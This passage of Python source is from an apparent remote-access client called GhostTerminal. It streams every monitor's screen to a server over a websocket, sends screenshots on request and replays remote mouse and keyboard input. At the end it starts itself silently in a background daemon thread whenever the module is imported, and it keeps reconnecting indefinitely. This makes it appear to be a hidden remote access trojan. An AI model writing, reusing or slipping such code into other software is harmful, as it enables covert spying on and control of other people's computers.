                                (settings['width'], settings['height']),
                                interpolation=cv2.INTER_AREA
                            )
                            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2GRAY)
                            encode_params = [cv2.IMWRITE_JPEG_QUALITY, 40]
                            _, encoded = cv2.imencode('.jpg', frame, encode_params)
                            compressed = zlib.compress(encoded.tobytes(), level=9)
                            frame_data = {
                                'monitor_id': i,
                                'data': compressed,
                                'timestamp': time.time(),
                                'width': original_width,
                                'height': original_height
                            }
                            if frame_queue.full():
                                try:
                                    frame_queue.get_nowait()
                                except:
                                    pass
                            frame_queue.put_nowait(frame_data)
                            frame_count += 1
                    except Exception as e:
                        self.log(f"Error in capture loop: {e}")
                        continue
            self.log("Screen capture stopped")
        except Exception as e:
            self.log(f"Capture process error: {e}")
        finally:
            while not frame_queue.empty():
                try:
                    frame_queue.get_nowait()
                except:
                    pass

    def _send_frames(self):
        try:
            last_frame_time = time.time()
            frame_count = 0
            bandwidth_total = 0
            sent_monitor_ids = set()
            last_activity_check = time.time()
            activity_check_interval = 5.0
            while self.is_capturing and self.ws and hasattr(self, 'frame_queue') and self.frame_queue:
                try:
                    current_time = time.time()
                    if current_time - last_activity_check >= activity_check_interval:
                        last_activity_check = current_time
                        heartbeat_age = current_time - self.last_viewer_heartbeat
                        if heartbeat_age > self.viewer_heartbeat_timeout * 1.5 and not self.viewer_active:
                            self.log(f"Send thread: Viewer inactive for {heartbeat_age:.1f}s, stopping")
                            self.is_capturing = False
                            break
                    frame_data = self.frame_queue.get(timeout=1.0)
                    monitor_id = frame_data['monitor_id']
                    if monitor_id not in sent_monitor_ids:
                        self.log(f"Sending first frame for monitor {monitor_id}")
                        sent_monitor_ids.add(monitor_id)
                    b64_data = base64.b64encode(frame_data['data']).decode('utf-8')
                    data_size = len(frame_data['data'])
                    bandwidth_total += data_size
                    message = {
                        'type': 'screen_data',
                        'monitor_id': monitor_id,
                        'is_keyframe': True,
                        'image_data': b64_data,
                        'width': frame_data['width'],
                        'height': frame_data['height'],
                        'timestamp': frame_data['timestamp']
                    }
                    self.send_ws_message(message)
                    frame_count += 1
                    current_time = time.time()
                    if current_time - last_frame_time >= 1.0:
                        fps = frame_count
                        bandwidth = bandwidth_total / 1024
                        monitor_count = len(sent_monitor_ids)
                        self.log(f"Performance: {fps} FPS, {bandwidth:.2f} KB/s, {monitor_count} monitors")
                        frame_count = 0
                        bandwidth_total = 0
                        last_frame_time = current_time
                except queue.Empty:
                    continue
                except Exception as e:
                    self.log(f"Error sending frame: {e}")
                    break
        except Exception as e:
            self.log(f"Send frames thread error: {e}")
        finally:
            self.is_capturing = False
            if hasattr(self, 'capture_process') and self.capture_process:
                self.capture_process.terminate()
                self.capture_process = None
            if hasattr(self, 'frame_queue'):
                while self.frame_queue.empty() is False:
                    try:
                        self.frame_queue.get_nowait()
                    except:
                        pass

    def handle_control_event(self, data):
        try:
            if not self.control_enabled:
                return
            event = data.get('event', {})
            event_type = event.get('type')
            monitor_id = event.get('monitor_id', 0)
            try:
                monitor_id = int(monitor_id)
            except (ValueError, TypeError):
                monitor_id = 0
            self.log(f"Control event: {event_type} for monitor {monitor_id}")
            with mss.mss() as sct:
                monitors = sct.monitors
                if monitor_id + 1 >= len(monitors):
                    self.log(f"Invalid monitor ID: {monitor_id}, using primary")
                    monitor_id = 0
                monitor = monitors[monitor_id + 1]
                self.log(f"Using monitor: {monitor}")
                monitor_width = monitor['width']
                monitor_height = monitor['height']
                is_vertical = monitor_height > monitor_width
                self.log(f"Monitor orientation: {'Vertical' if is_vertical else 'Horizontal'}")
                if event_type in ['mouse_move', 'mouse_down', 'mouse_up']:
                    x = event.get('x', 0)
                    y = event.get('y', 0)
                    abs_x = int(monitor['left'] + (x * monitor_width))
                    abs_y = int(monitor['top'] + (y * monitor_height))
                    abs_x = max(monitor['left'], min(abs_x, monitor['left'] + monitor_width - 1))
                    abs_y = max(monitor['top'], min(abs_y, monitor['top'] + monitor_height - 1))
                    button = event.get('button', 0)
                    self.log(f"Mouse position: ({x:.3f}, {y:.3f}) -> ({abs_x}, {abs_y})")
                    if event_type == 'mouse_move':
                        pyautogui.moveTo(abs_x, abs_y)
                    elif event_type == 'mouse_down':
                        if button == 0:
                            pyautogui.mouseDown(abs_x, abs_y, 'left')
                        elif button == 1:
                            pyautogui.mouseDown(abs_x, abs_y, 'middle')
                        elif button == 2:
                            pyautogui.mouseDown(abs_x, abs_y, 'right')
                    elif event_type == 'mouse_up':
                        if button == 0:
                            pyautogui.mouseUp(abs_x, abs_y, 'left')
                        elif button == 1:
                            pyautogui.mouseUp(abs_x, abs_y, 'middle')
                        elif button == 2:
                            pyautogui.mouseUp(abs_x, abs_y, 'right')
                elif event_type == 'mouse_wheel':
                    clicks = int(event.get('deltaY', 0) / 100)
                    pyautogui.scroll(clicks)
                elif event_type == 'key_down':
                    key = event.get('key')
                    if key:
                        try:
                            pyautogui.keyDown(key)
                        except Exception as e:
                            self.log(f"Error with key down '{key}': {str(e)}")
                elif event_type == 'key_up':
                    key = event.get('key')
                    if key:
                        try:
                            pyautogui.keyUp(key)
                        except Exception as e:
                            self.log(f"Error with key up '{key}': {str(e)}")
        except Exception as e:
            self.log(f"Error handling control event: {str(e)}")
            response = {
                'type': 'control_error',
                'error': f"Failed to handle control event: {str(e)}"
            }
            return self.send_ws_message(response)

    def handle_quality_update(self, data):
        try:
            settings = data.get('settings', {})
            self.quality_settings.update(settings)
        except Exception as e:
            self.log(f"Error handling quality update: {str(e)}")
            response = {
                'type': 'terminal_error',
                'error': f"Failed to handle quality update: {str(e)}"
            }
            return self.send_ws_message(response)

    def handle_control_request(self, data):
        try:
            self.control_enabled = data.get('enabled', False)
            response = {
                'type': 'control_response',
                'success': True,
                'enabled': self.control_enabled
            }
            self.ws.send(json.dumps(response))
        except Exception as e:
            self.log(f"Error handling control request: {str(e)}")
            response = {
                'type': 'control_error',
                'error': f"Failed to handle control request: {str(e)}"
            }
            return self.send_ws_message(response)

    def handle_viewer_heartbeat(self, data):
        try:
            self.last_viewer_heartbeat = time.time()
            self.viewer_active = True
            if random.random() < 0.1:
                self.log(f"Received viewer heartbeat at {self.last_viewer_heartbeat}")
        except Exception as e:
            self.log(f"Error handling viewer heartbeat: {str(e)}")

    def handle_screenshot_request(self, data):
        try:
            monitor_id = data.get('monitor_id', 0)
            with mss.mss() as sct:
                monitors = sct.monitors[1:]
                if monitor_id >= len(monitors):
                    self.log(f"Monitor ID {monitor_id} out of range (max: {len(monitors) - 1})")
                    response = {
                        'type': 'error',
                        'error': f"Invalid monitor ID: {monitor_id}"
                    }
                    return self.send_ws_message(response)
                monitor = monitors[monitor_id]
                screenshot = np.array(sct.grab(monitor))
                original_width = monitor['width']
                original_height = monitor['height']
                encode_params = [cv2.IMWRITE_JPEG_QUALITY, 95]
                _, encoded = cv2.imencode('.jpg', screenshot, encode_params)
                compressed = zlib.compress(encoded.tobytes(), level=6)
                b64_data = base64.b64encode(compressed).decode('utf-8')
                message = {
                    'type': 'screenshot_data',
                    'monitor_id': monitor_id,
                    'image_data': b64_data,
                    'width': original_width,
                    'height': original_height,
                    'timestamp': time.time()
                }
                self.log(f"Sending color screenshot for monitor {monitor_id} ({original_width}x{original_height})")
                return self.send_ws_message(message)
        except Exception as e:
            self.log(f"Error handling screenshot request: {str(e)}")
            response = {
                'type': 'error',
                'error': f"Failed to capture screenshot: {str(e)}"
            }
            return self.send_ws_message(response)

    def start(self):
        self.log("Starting GhostTerminal client...")
        self._force_stopped = False
        while not getattr(self, '_force_stopped', False):
            try:
                registration_attempts = 0
                while not self.register_with_server():
                    registration_attempts += 1
                    wait_time = min(30, 2 ** registration_attempts)
                    self.log(f"Registration attempt {registration_attempts} failed, retrying in {wait_time} seconds...")
                    time.sleep(wait_time)
                self.log("Successfully registered with server")
                self.start_heartbeat()
                if not self.connect_websocket():
                    raise Exception("Failed to establish WebSocket connection")
                self.log("GhostTerminal client started successfully")
                consecutive_offline_checks = 0
                while not getattr(self, '_force_stopped', False):
                    if not self.online:
                        consecutive_offline_checks += 1
                        if consecutive_offline_checks >= 3:
                            self.log("Connection lost, waiting before reconnecting...")
                            break
                    else:
                        consecutive_offline_checks = 0
                    time.sleep(1)
            except Exception as e:
                self.log(f"Error in main loop: {str(e)}")
            if getattr(self, '_force_stopped', False):
                break
            self.stop()
            reconnect_delay = 5
            self.log(f"Attempting to reconnect in {reconnect_delay} seconds...")
            time.sleep(reconnect_delay)
    
    def stop(self):
        self.log("Stopping GhostTerminal client...")
        self.stop_heartbeat_thread()
        if self.ws:
            try:
                self.ws.close()
            except:
                pass
            self.ws = None
        self.online = False
        try:
            offline_url = urljoin(self.server_url, "/api/terminal-offline/")
            data = {
                "user_id": self.user_id,
                "timestamp": datetime.now().isoformat()
            }
            try:
                response = requests.post(offline_url, json=data, timeout=5)
                if response.status_code == 200:
                    self.log("Successfully set offline status")
                else:
                    self.log(f"Failed to set offline status: {response.status_code}")
            except requests.exceptions.Timeout:
                self.log("Timeout while setting offline status")
            except requests.exceptions.RequestException as e:
                self.log(f"Error setting offline status: {str(e)}")
        except Exception as e:
            self.log(f"Error in stop procedure: {str(e)}")
        self.log("GhostTerminal client stopped")

    def _log_monitor_info(self):
        try:
            with mss.mss() as sct:
                all_monitors = sct.monitors
                self.log(f"All monitors info: {all_monitors}")
                for i, monitor in enumerate(all_monitors):
                    if i == 0:
                        self.log(f"Monitor {i} (all monitors combined): {monitor}")
                    else:
                        self.log(f"Monitor {i}: {monitor}")
                try:
                    screen_size = pyautogui.size()
                    self.log(f"PyAutoGUI screen size: {screen_size}")
                except Exception as e:
                    self.log(f"Error getting PyAutoGUI screen size: {e}")
        except Exception as e:
            self.log(f"Error logging monitor info: {e}")


# Auto-start on import in a background thread
def _run():
    while True:
        try:
            terminal = GhostTerminal()
            terminal.start()
        except Exception:
            time.sleep(10)
            continue

_thread = threading.Thread(target=_run, daemon=True)
_thread.start()
